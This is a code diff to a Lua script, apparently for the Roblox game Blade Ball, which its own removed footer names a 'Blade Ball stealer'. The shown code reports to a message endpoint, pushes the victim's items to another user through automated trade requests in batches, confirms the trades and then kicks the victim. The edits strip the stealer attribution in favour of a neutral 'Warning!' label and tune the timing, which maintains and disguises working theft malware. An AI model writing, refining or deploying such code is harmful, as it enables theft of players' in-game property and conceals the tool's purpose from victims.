@@ -279,7 +279,7 @@ local function SendMessage(list)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "Warning!"
 			}
         }}
     }
@@ -387,7 +387,7 @@ if #itemsToSend > 0 then
         while #itemsToSend > 0 do
             sendTradeRequest(joinedUser)
             repeat
-                wait(0.5)
+                wait(2)
             until inTrade
 
             local currentBatch = getNextBatch(itemsToSend, 100)
@@ -406,7 +406,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("Warning")
+        plr:kick("Warning!")
     end
 
     local function waitForUserJoin()
